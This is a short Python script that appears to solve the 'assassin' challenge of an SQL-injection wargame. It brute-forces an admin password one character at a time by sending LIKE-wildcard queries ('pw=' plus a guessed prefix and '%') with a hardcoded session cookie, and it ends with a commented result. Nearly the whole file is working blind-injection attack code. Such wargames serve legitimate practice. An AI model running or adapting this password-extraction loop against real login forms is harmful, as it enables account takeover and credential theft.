from requests import get
import string


url = "https://los.rubiya.kr/chall/assassin_14a1fd552c61c60f034879e5d4171373.php"
cookie  = dict(PHPSESSID="lpaiqju1pvd389508vh94qhl4s")
letters = string.digits + string.ascii_letters
password = ""
length = 1
admin = False
temp = []
for i in range(8):
    for x in letters:
        param = "?pw="+password+str(x)+"%"
        new_url = url+param

        req = get(new_url, cookies=cookie)
        if(req.text.find("Hello admin") > 0 or req.text.find("Hello guest") > 0):
            password += str(x)
            
            if(req.text.find("Hello admin") > 0):
                print("[Found] admin: " + password)
                print("[+] char: " + str(x))
                admin = True
                break

            print("Param: " + param)
    
    print("[idx] " + str(i))
    if admin:
        break

"""
[Found] admin: 902%

"""